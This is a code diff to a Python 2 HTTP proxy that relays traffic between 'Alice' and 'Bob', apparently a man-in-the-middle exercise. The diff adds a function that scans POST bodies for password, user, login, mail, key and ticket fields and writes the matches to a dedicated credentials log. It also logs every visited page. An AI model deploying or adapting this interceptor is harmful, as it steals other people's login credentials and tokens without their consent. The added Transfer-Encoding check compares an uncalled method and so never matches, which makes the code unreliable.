@@ -2,21 +2,43 @@ from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 from urlparse import urlparse
 import httplib
 import logging
-
+import re
 HOST_NAME = ''
 PORT_NUMBER = 4570
 
+interesting_parameters_list = ['pass', 'user', 'name', 'login', 'mail', 'key', 'ticket']
+def password_catcher(body):
+    parameters = body.split('&')
+    if len(parameters) < 2:
+        return
+    found_interesting_val = []
+    for kv_pair in parameters:
+        for interesting_parameters_list_value in interesting_parameters_list:
+            if len(re.findall(interesting_parameters_list_value, kv_pair)) > 0:
+                found_interesting_val.append(kv_pair)
+                break
+    return found_interesting_val
 
 class Proxy_Server(BaseHTTPRequestHandler):
     def do_GET(self):
-        logging.info(self.path)
+        global proxy_page_visit_logger
+        global password_logger
+        proxy_page_visit_logger.info(self.path)
 
-        #  getting data from Alice
+        #  getting data from Alice, checking login credentials
         request_method = self.command
         request_url = self.path
         _request_len = self.headers.getheader('content-length')
         request_body = self.rfile.read(0 if _request_len is None else int(_request_len))
         request_headers = self.headers.dict  # as dictionary
+
+        if request_method == 'POST':
+            interesting_val = password_catcher(request_body)
+            if len(interesting_val) > 0:
+                log_info = self.path
+                for val in interesting_val:
+                    log_info += ' ' + val
+                password_logger.info(log_info)  # the same page may be logged twice. This is done on purpose
 
         #  connecting to Bob
         parsed_url = urlparse(request_url)
@@ -38,7 +60,7 @@ class Proxy_Server(BaseHTTPRequestHandler):
         foo = str(_buff_size)
         respone_headers = dict(resp.msg.dict)  # wywalic transfer encoding i dac content len, co sie dzieje z kodowaniem?
         for key in respone_headers:
-            if key.lower() == 'Transfer-Encoding'.lower():
+            if key.lower() == 'Transfer-Encoding'.lower() and respone_headers[key].lower == 'chunked':
                 respone_headers.pop(key, None)
                 break
         for key in respone_headers:
@@ -68,6 +90,7 @@ class Proxy_Server(BaseHTTPRequestHandler):
         self.wfile.write(respone_data)
 
     do_POST = do_GET
+    do_CONNECT = do_GET
 
 
 if __name__ == "__main__":
@@ -83,7 +106,9 @@ if __name__ == "__main__":
     # data = resp.read()
     # pass
 
-    logging.basicConfig(filename='log.txt', level=logging.INFO)
+    logging.basicConfig(filename='log.txt', level=logging.INFO, format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s')
+    proxy_page_visit_logger = logging.getLogger('VISIT')
+    password_logger = logging.getLogger('CREDENTIALS')
     httpd = HTTPServer((HOST_NAME, PORT_NUMBER), Proxy_Server)
     while 1:
         try:
